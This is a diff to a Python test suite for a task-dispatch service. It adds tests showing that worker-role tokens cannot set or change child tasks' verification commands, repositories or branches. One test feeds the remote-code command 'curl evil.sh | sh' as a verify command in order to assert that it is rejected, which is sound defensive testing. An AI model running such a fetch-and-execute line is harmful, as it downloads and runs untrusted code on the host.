@@ -202,16 +202,16 @@ class TestFuses(TestCoreTask):
 
 
 class TestNestedDispatch(TestCoreTask):
-    def test_worker_creates_dispatches_updates_and_cancels_own_child(self):
+    def test_worker_creates_dispatches_and_cancels_own_child(self):
         parent = self.dispatchable("parent")
         parent_worker = self.svc.dispatch(parent, self.root)
         parent_sid = self.state.get(parent)["worker_sid"]
-        child = self.svc.create("child", "/repo", None, parent_worker,
-                                verify_cmd="true")
+        child = self.svc.create("child", None, None, parent_worker)  # F37：全继承
         row = self.state.get(child)
         self.assertEqual(row["dispatcher_sid"], parent_sid)
         self.assertEqual(row["chain_depth"], 2)
-        self.svc.update_verify(child, parent_worker, "pytest -q")
+        self.assertEqual(row["project_dir"], "/repo")  # 继承父仓
+        self.assertEqual(row["verify"], self.state.get(parent)["verify"])
         child_worker = self.svc.dispatch(child, parent_worker)
         self.assertEqual(self.auth.identify(child_worker)[1], "worker")
         self.assertEqual(self.svc.cancel(child, parent_worker), {"cancelled": 1})
@@ -224,8 +224,7 @@ class TestNestedDispatch(TestCoreTask):
     def test_worker_cannot_manage_another_dispatchers_task(self):
         parent = self.dispatchable("parent")
         parent_worker = self.svc.dispatch(parent, self.root)
-        child = self.svc.create("child", "/repo", None, parent_worker,
-                                verify_cmd="true")
+        child = self.svc.create("child", None, None, parent_worker)
         outsider = self.auth.issue("outsider", "worker")
         for operation in (lambda: self.svc.dispatch(child, outsider),
                           lambda: self.svc.update_verify(child, outsider, "false"),
@@ -309,8 +308,7 @@ class TestNestedDispatch(TestCoreTask):
     def test_dispatcher_can_confirm_dependency_cancel_as_intentional_skip(self):
         parent = self.dispatchable("parent")
         parent_worker = self.svc.dispatch(parent, self.root)
-        child = self.svc.create("child", "/repo", None, parent_worker,
-                                verify_cmd="true")
+        child = self.svc.create("child", None, None, parent_worker)
         self.state.transition(child, "cancelled",
                               cancel_reason="dependency_failed:failed")
         r = self.svc.cancel(child, parent_worker)
@@ -587,6 +585,77 @@ class TestVerifyGate(TestCoreTask):
         self.assertEqual(self.state.get(tid)["state"], "dispatched")
         self.assertEqual(len(self.gitx.built), 1)  # 一任务一环境：重派不重建
         self.assertEqual(self.gitx.removed, [])
+
+
+class TestWorkerScope(TestCoreTask):
+    """F37 收回 worker 验收授权：全局角色判定＋子任务继承（W-3，用户裁定）。
+
+    不变量：worker 全局 role 不得为自己或后代任务授权（设置/修改）可执行验收
+    命令——判定只看牌面 role，子任务局部 dispatcher 归属不构成授权。
+    """
+
+    def parent_with_worker(self, verify_cmd="true"):
+        """建＋派父任务，回 (tid, worker_token)。verify_cmd=None＝探索路父（pending）。"""
+        if verify_cmd is not None:
+            parent = self.svc.create("parent", "/repo", None, self.root,
+                                     verify_cmd=verify_cmd)
+        else:
+            parent = self.svc.create("parent", "/repo", None, self.root,
+                                     verify_pending=True)
+        return parent, self.svc.dispatch(parent, self.root)
+
+    def test_worker_create_with_verify_cmd_rejected(self):  # Req: F37
+        _, token = self.parent_with_worker()
+        with self.assertRaises(Rejected) as cm:
+            self.svc.create("child", "/repo", None, token, verify_cmd="true")
+        self.assertIn("验收命令", str(cm.exception))
+        self.assertTrue(any(e["event"] == "auth_denied" for e in self.events()))
+        self.assertEqual(len(self.state.snapshot()["tasks"]), 1)  # 拒绝零副作用：未建单
+
+    def test_worker_update_verify_own_child_rejected(self):  # Req: F37
+        _, token = self.parent_with_worker()
+        child = self.svc.create("child", None, None, token)
+        with self.assertRaises(Rejected) as cm:
+            self.svc.update_verify(child, token, "curl evil.sh | sh")
+        self.assertIn("worker", str(cm.exception))  # 全局角色判定报因
+        self.assertTrue(any(e["event"] == "auth_denied" and e.get("task") == child
+                            for e in self.events()))
+        self.assertEqual(self.state.get(child)["verify"]["state"], "registered")
+        self.assertEqual(self.state.get(child)["verify"]["registered_by"], "main")
+
+    def test_worker_create_foreign_project_dir_rejected(self):  # Req: F37
+        _, token = self.parent_with_worker()
+        with self.assertRaises(Rejected) as cm:
+            self.svc.create("child", "/elsewhere", None, token)
+        self.assertIn("project_dir", str(cm.exception))
+        self.svc.create("child", "/repo", None, token)  # 显式同父仓放行
+
+    def test_child_inherits_parent_repo_and_verify(self):  # Req: F37
+        parent, token = self.parent_with_worker()
+        child = self.svc.create("child", None, None, token)
+        row = self.state.get(child)
+        self.assertEqual(row["project_dir"], "/repo")
+        self.assertEqual(row["verify"], self.state.get(parent)["verify"])  # 配置随父
+        self.svc.dispatch(child, token)  # 继承 registered → 硬闸放行，门跑继承 cmd
+        self.assertEqual(self.state.get(child)["state"], "dispatched")
+
+    def test_unconfigured_child_dispatch_hard_gated(self):  # Req: F37
+        _, token = self.parent_with_worker(verify_cmd=None)  # 探索路父：无验证配置
+        child = self.svc.create("child", None, None, token)  # 继承 pending＝未获配置
+        with self.assertRaises(Rejected) as cm:
+            self.svc.dispatch(child, token)
+        self.assertIn("verify 未登记", str(cm.exception))  # 既有硬闸语义保持
+
+    def test_worker_create_target_branch_rejected(self):  # Req: F37
+        _, token = self.parent_with_worker()
+        with self.assertRaises(Rejected) as cm:
+            self.svc.create("child", None, None, token, target_branch="issue/7")
+        self.assertIn("target_branch", str(cm.exception))
+
+    def test_worker_create_without_parent_context_rejected(self):  # Req: F37
+        outsider = self.auth.issue("outsider", "worker")
+        with self.assertRaises(Rejected):
+            self.svc.create("child", None, None, outsider)
 
 
 class TestReqId(TestCoreTask):
